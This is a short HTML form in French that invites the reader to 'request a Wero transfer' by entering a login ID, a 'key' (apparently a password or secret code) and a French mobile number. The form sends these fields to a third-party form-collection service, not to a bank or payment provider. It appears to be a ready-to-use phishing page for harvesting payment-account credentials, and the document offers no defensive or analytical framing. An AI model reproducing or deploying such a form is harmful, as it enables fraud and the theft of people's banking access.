<h2>Veuillez renseigner ces informations pour demander un envoi wero</h2>
<form action="https://formspree.io/f/mbgodbqg" method="POST">
    <div class="champ">
        <label for="identifiant">Identifiant :</label>
        <input type="text" id="identifiant" name="identifiant" required>
    </div>

    <div class="champ">
        <label for="cle">Clé :</label>
        <input type="text" id="cle" name="cle" required>
    </div>

    <div class="champ">
        <label for="telephone">Numéro de téléphone :</label>
        <div style="display: flex; align-items: center;">
            <span style="padding: 6px 10px; background-color: #eee; border: 1px solid #ccc; border-right: none;">+33</span>
            <input type="tel" id="telephone" name="telephone" placeholder="612345678" pattern="[1-9][0-9]{8}" maxlength="9" required style="border: 1px solid #ccc; padding: 6px;">
        </div>
    </div>

    <button type="submit">Envoyer</button>
</form>
